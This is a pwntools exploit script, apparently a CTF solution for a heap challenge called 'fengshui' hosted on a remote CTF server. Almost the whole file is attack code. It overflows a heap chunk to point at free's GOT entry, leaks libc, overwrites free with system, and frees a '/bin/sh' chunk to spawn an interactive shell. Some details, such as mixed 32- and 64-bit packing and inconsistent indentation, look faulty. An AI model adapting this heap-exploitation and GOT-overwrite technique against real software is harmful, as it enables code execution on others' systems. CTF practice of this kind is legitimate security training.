from pwn import *

#p = process('./fengshui')
p = remote('ctf.j0n9hyun.xyz', 3028)
e = ELF('./fengshui')
l = ELF('./libc.so.6')

context.log_level="debug"

def add(size,name,text_length,text):
	p.sendlineafter("Choice: ", '0')
	p.sendlineafter('Size of description: ',str(int(size)))
	p.sendlineafter('Name: ', str(name))
	p.sendlineafter('Text length: ',str(text_length))
	p.sendlineafter('Text: ',str(text))


def free(index):
	p.sendlineafter("Choice: ", '1')
	p.sendlineafter("Index: ", str(index))
	
def display(index):
	p.sendlineafter("Choice: ", '2')
        p.sendlineafter("Index: ", str(index))

def update(index, text_length, text):
	p.sendlineafter("Choice: ", '3')
	p.sendlineafter("Index: ", str(index))
	p.sendlineafter('Text length: ',str(text_length))
	p.sendlineafter('Text: ',str(text))

add(10,'a',1,1)
add(10,'a',1,1)
add(len('/bin/sh'), 'a', len('/bin/sh'),'/bin/sh')
free(0)

payload = ''
payload += 'a' * 128
payload += p32(0)
payload += p32(17)
payload += 'a' * 8
payload += p32(0)
payload += p32(137)
payload += p64(e.got['free'])

add(128,'a',len(payload),payload)
display(1)

p.recvuntil('Description: ')
libc = u32(p.recv(4)) - l.sym['free']
log.info('libc : ' + hex(libc))

update(1,len(payload), p32(libc + l.sym['system']))
pause()
free(2)

p.interactive()
